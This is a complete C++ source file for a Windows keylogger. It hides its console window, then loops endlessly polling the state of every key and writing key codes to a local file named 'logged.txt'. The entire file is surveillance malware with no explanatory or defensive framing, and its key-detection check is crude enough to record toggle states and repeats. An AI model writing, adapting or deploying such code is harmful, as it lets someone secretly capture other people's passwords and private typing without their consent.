#include <iostream>
#include <fstream>
#include <windows.h>
#include <winuser.h>
using namespace std;

#define LOG_FILE "logged.txt"
ofstream outputLog (LOG_FILE);


int main()
{
    HWND hwnd = GetConsoleWindow();
    ShowWindow(hwnd, SW_HIDE);

    while (true) {
        for (int i = 0; i < 256; i++) {
            if (GetKeyState(i) & 0xF) {
                outputLog.put((char)i);
            }
        }
    }

    return 0;
}